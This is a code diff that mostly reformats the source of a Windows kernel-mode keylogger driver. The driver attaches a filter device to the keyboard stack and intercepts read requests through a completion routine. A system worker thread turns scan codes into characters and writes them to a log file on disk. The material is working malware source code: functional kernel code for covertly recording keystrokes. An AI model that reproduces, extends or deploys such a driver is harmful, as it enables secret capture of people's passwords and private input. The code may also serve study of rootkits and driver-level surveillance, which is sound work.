@@ -221,21 +221,21 @@ namespace {
 						  FALSE);
 
 		auto Irp = IoBuildDeviceIoControlRequest(IOCTL_KEYBOARD_QUERY_INDICATORS,
-												 DeviceExt->LowerDevice,
-												 nullptr,
-												 0,
-												 &IndicatorParams,
-												 sizeof(KEYBOARD_ATTRIBUTES),
-												 TRUE,
-												 &KEvent,
-												 &StatusBlk);
+							 DeviceExt->LowerDevice,
+							 nullptr,
+							 0,
+							 &IndicatorParams,
+							 sizeof(KEYBOARD_ATTRIBUTES),
+							 TRUE,
+							 &KEvent,
+							 &StatusBlk);
 
 		if (IoCallDriver(DeviceExt->LowerDevice, Irp) == STATUS_PENDING) 
 			(VOID) KeWaitForSingleObject(&KEvent,
-										 Suspended,
-										 KernelMode,
-										 FALSE,
-										 nullptr);
+						     Suspended,
+						     KernelMode,
+						     FALSE,
+						     nullptr);
 		
 
 		auto status = Irp->IoStatus.Status;
@@ -329,29 +329,27 @@ CreateAttachKeylogger(
 	UNICODE_STRING KDeviceName;
 	RtlInitUnicodeString(&KDeviceName, KEYBOARD_DEVICE_NAME);
 	auto Status = IoCreateDevice(DriverObj,
-								 sizeof(DEVICE_EXTENSION),
-								 &KDeviceName,
-								 FILE_DEVICE_KEYBOARD,
-								 0,
-								 FALSE,
-								 &KDevice);
+				     sizeof(DEVICE_EXTENSION),
+				     &KDeviceName,
+				     FILE_DEVICE_KEYBOARD,
+				     0,
+				     FALSE,
+				     &KDevice);
 	if (!NT_SUCCESS(Status))
 		return Status;
 
-	RtlSecureZeroMemory(KDevice->DeviceExtension,
-						sizeof(DEVICE_EXTENSION));
+	RtlSecureZeroMemory(KDevice->DeviceExtension, sizeof(DEVICE_EXTENSION));
 
 	KDevice->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE | DRVO_LEGACY_RESOURCES);
 	KDevice->Flags &= ~DO_DEVICE_INITIALIZING;
 
 	DEXTENSION(Self) = KDevice;
 	DEXTENSION(SelfName) = KDeviceName;
-	RtlInitUnicodeString(&DEXTENSION(LowerDeviceName),
-						 TARGET_DEVICE_NAME);
+	RtlInitUnicodeString(&DEXTENSION(LowerDeviceName), TARGET_DEVICE_NAME);
 
-	Status = IoAttachDevice(KDevice,
-							&DEXTENSION(LowerDeviceName),
-							&DEXTENSION(LowerDevice));
+	Status = IoAttachDevice(KDevice, 
+				&DEXTENSION(LowerDeviceName), 
+				&DEXTENSION(LowerDevice));
 	if (!NT_SUCCESS(Status))
 		IoDeleteDevice(KDevice);
 
@@ -369,11 +367,11 @@ KKeylogger::ReadDispatch(
 	io_stack_location for the next lower driver */
 	IoCopyCurrentIrpStackLocationToNext(Irp);
 	IoSetCompletionRoutine(Irp,
-						   OnReadCompletion,
-						   nullptr,
-						   TRUE,
-						   TRUE,
-						   TRUE);
+			       OnReadCompletion,
+			       nullptr,
+			       TRUE,
+			       TRUE,
+			       TRUE);
 	++KKeylogger::PendingIrps;
 	return IoCallDriver(DEXTENSION(LowerDevice), Irp);
 }
@@ -399,7 +397,7 @@ so we signal a worker thread to write data out to the disk,
 which will be in PASSIVE_LEVEL so all file I/O can be done from there
 */
 
-/* DISPATCH LEVEL */
+
 NTSTATUS
 KKeylogger::OnReadCompletion(
 	PDEVICE_OBJECT KDevice,
@@ -430,7 +428,6 @@ KKeylogger::OnReadCompletion(
 						   FALSE);
 	}
 
-
 	if (Irp->PendingReturned)
 		IoMarkIrpPending(Irp);
 
@@ -452,20 +449,20 @@ KKeylogger::Unload(
 	Interval.QuadPart = 1000000;
 	while (KKeylogger::PendingIrps > 0ul)
 		KeDelayExecutionThread(KernelMode,
-							   FALSE,
-							   &Interval);
+				       FALSE,
+				       &Interval);
 
 	/* terminate worker thread */
 	KDEXTENSION(ThreadTerminate) = TRUE;
 	KeReleaseSemaphore(&KDEXTENSION(SemaphoreLock),
-					   IO_NO_INCREMENT,
-					   1l,
-					   TRUE);
+					IO_NO_INCREMENT,
+					1l,
+					TRUE);
 	KeWaitForSingleObject(KDEXTENSION(WorkerThread),
-						  Executive,
-						  KernelMode,
-						  FALSE,
-						  nullptr);
+			      Executive,
+			      KernelMode,
+			      FALSE,
+			      nullptr);
 	DbgPrint("[+] KeyLogger WorkerThread successfully terminated!\n");
 	ExDeleteNPagedLookasideList(KDEXTENSION(LookasideList));
 	ZwClose(KDEXTENSION(LogFile));
@@ -487,22 +484,22 @@ CreateLogFile(
 	OBJECT_ATTRIBUTES ObjAttrs {};
 	IO_STATUS_BLOCK StatusBlk {};
 	InitializeObjectAttributes(&ObjAttrs,
-							   &LogFileName,
-							   OBJ_CASE_INSENSITIVE,
-							   nullptr,
-							   nullptr);
+				   &LogFileName,
+				   OBJ_CASE_INSENSITIVE,
+				   nullptr,
+				   nullptr);
 
 	auto Status = ZwCreateFile(&KDEXTENSION(LogFile),
-							   GENERIC_WRITE,
-							   &ObjAttrs,
-							   &StatusBlk,
-							   nullptr,
-							   FILE_ATTRIBUTE_NORMAL,
-							   0,
-							   FILE_OPEN_IF,
-							   FILE_SYNCHRONOUS_IO_NONALERT,
-							   nullptr,
-							   0ul);
+				   GENERIC_WRITE,
+				   &ObjAttrs,
+				   &StatusBlk,
+				   nullptr,
+				   FILE_ATTRIBUTE_NORMAL,
+				   0,
+				   FILE_OPEN_IF,
+				   FILE_SYNCHRONOUS_IO_NONALERT,
+				   nullptr,
+				   0ul);
 	if (!NT_SUCCESS(Status))
 		DbgPrint("[-] Failed to create LogFile: 0x%08X\n", Status);
 	return Status;
@@ -525,50 +522,49 @@ InitializeThreadLogger(
 			while (TRUE) {
 				/* wait for data to come through*/
 				KeWaitForSingleObject(&DeviceExt->SemaphoreLock,
-									  Executive,
-									  KernelMode,
-									  FALSE,
-									  nullptr);
+						      Executive,
+						      KernelMode,
+						      FALSE,
+						      nullptr);
 				
 				if (DeviceExt->ThreadTerminate == TRUE)
 					PsTerminateSystemThread(STATUS_SUCCESS);
 
 				char Keys[3] {};
 				ConvertScanCodeToKeyCode(DeviceExt,
-										 DeviceExt->KeyCodeData,
-										 Keys);
+							 DeviceExt->KeyCodeData,
+							 Keys);
 				if (Keys != 0) {
 					if (DeviceExt->LogFile) /* super duper sanity check */ {
 						IO_STATUS_BLOCK StatusBlk;
 						DbgPrint("[+] Writing ScanCode to file.\n");
 						(!NT_SUCCESS(ZwWriteFile(DeviceExt->LogFile,
-												 nullptr,
-												 nullptr,
-												 nullptr,
-												 &StatusBlk,
-												 &Keys,
-												 (ULONG) strlen(Keys),
-												 nullptr,
-												 nullptr))) ?
+									 nullptr,
+									 nullptr,
+									 nullptr,
+									 &StatusBlk,
+									 &Keys,
+									 (ULONG) strlen(Keys),
+									 nullptr,
+									 nullptr))) ?
 							DbgPrint("[-] Writing ScanCode failed!\n") :
 							DbgPrint("[+] Successfully wrote [%s] to file\n", Keys);
 
 						
 					}
 				}
-				ExFreeToNPagedLookasideList(DeviceExt->LookasideList,
-											DeviceExt->KeyCodeData);
+				ExFreeToNPagedLookasideList(DeviceExt->LookasideList, DeviceExt->KeyCodeData);
 			}
 	};
 
 	HANDLE ThreadHandle;
 	auto Status = PsCreateSystemThread(&ThreadHandle,
-									   0,
-									   nullptr,
-									   nullptr,
-									   nullptr,
-									   KeyloggerThreadRoutine,
-									   DriverObj->DeviceObject->DeviceExtension);
+					   0,
+					   nullptr,
+					   nullptr,
+					   nullptr,
+					   KeyloggerThreadRoutine,
+					   DriverObj->DeviceObject->DeviceExtension);
 
 	if (!NT_SUCCESS(Status))
 		return Status;
@@ -578,16 +574,15 @@ InitializeThreadLogger(
 	/* Obtain a pointer to the thread object and store
 	it in the device extension */
 	ObReferenceObjectByHandle(ThreadHandle,
-							  THREAD_ALL_ACCESS,
-							  nullptr,
-							  KernelMode,
-							  (PVOID*) &KDEXTENSION(WorkerThread),
-							  nullptr);
+				  THREAD_ALL_ACCESS,
+				  nullptr,
+				  KernelMode,
+				  (PVOID*) &KDEXTENSION(WorkerThread),
+				  nullptr);
 
-	DbgPrint("[+] WorkerThread =  %x\n",
-			 &KDEXTENSION(WorkerThread));
+	DbgPrint("[+] WorkerThread =  %x\n", &KDEXTENSION(WorkerThread));
 
-	//We don't need the thread handle
+	// don't need the thread handle
 	ZwClose(ThreadHandle);
 	return Status;
 }
